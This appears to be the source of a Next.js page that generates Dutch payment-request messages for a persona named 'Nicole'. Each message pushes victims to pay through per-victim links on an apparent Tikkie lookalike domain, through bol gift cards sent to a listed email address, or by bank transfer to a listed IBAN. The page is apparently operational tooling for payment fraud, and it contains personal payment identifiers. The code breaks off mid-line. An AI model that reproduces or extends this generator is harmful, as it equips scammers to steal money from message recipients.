import { useEffect, useState } from 'react';
import Head from 'next/head';

export default function Nicole() {
  const [slug, setSlug] = useState(null);
  const [loading, setLoading] = useState(false);

  const baseUrl = 'https://betaalverzoek.nu';

  const generateNewSlug = async () => {
    setLoading(true);
    const res = await fetch('/api/generate-nicole-2');
    const { slug: newSlug } = await res.json();
    setSlug(newSlug);
    setLoading(false);
  };

  useEffect(() => {
    generateNewSlug();
  }, []);

  const handleCopy = (text, refresh = false) => {
    navigator.clipboard.writeText(text).then(() => {
      alert('Gekopieerd!');
      if (refresh) location.reload();
    });
  };

  const generateTikkieText = (amount) =>
    `💖 Wil je mij alsjeblieft betalen voor 'Tikkie' via ${baseUrl}/${slug}\n\nVia deze link kun je €${amount} betalen`;

  const generateBolText = (amount, url) =>
    `💖 Wil je mij alsjeblieft betalen via bol cadeaukaart? Binnen 1 minuut via: ${url}\n\nVia deze link kun je €${amount} betalen\n\nVul mijn emailadres in: colindabrand@outlook.com`;

  const bankText = `Liever via handmatige bankoverschrijving betalen? Dat kan ook: NL34BUNQ2106132808 tnv K. Bohak`;

  return (
    <div style={{ padding: '2rem', fontFamily: 'sans-serif' }}>
      <Head>
        <title>Link Generator</title>
        <meta name="robots" content="noindex" />
      </Head>

      <h1>Warning this is a backup page, notify Admin</h1>
      {slug ? (
        <>
          <p>
            <a href={`/${slug}`} target="_blank" rel="noopener noreferrer">
              /{slug}
            </a>
          </p>

          {/* Tikkie */}
          <div style={{ marginTop: '2rem' }}>
            <textarea
              style={{ width: '100%', height: '120px' }}
              readOnly
              value={generateTikkieText(30)}
            />
            <div style={{ marginTop: '0.5rem', display: 'flex', gap: '1rem', flexWrap: 'wrap' }}>
              <button onClick={() => handleCopy(generateTikkieText(30), true)}>Kopieer Tikkie-tekst</button>
              <button onClick={() => handleCopy(generateTikkieText(50), true)}>€50</button>
              <button onClick={() => handleCopy(generateTikkieText(70), true)}>€70</button>
              <button onClick={() => handleCopy(generateTikkieText(90), true)}>€90</button>
            </div>
          </div>

          {/* Bol */}
          <div style={{ marginTop: '2rem' }}>
            <textarea
              style={{ width: '100%', height: '120px' }}
              readOnly
              value={generateBolText(30, 'https://beltegoed.nl/order?productId=56280&quantity=1')}
            />
            <div style={{ marginTop: '0.5rem', display: 'flex', gap: '1rem', flexWrap: 'wrap' }}>
              <button onClick={() => handleCopy(generateBolText(30, 'https://
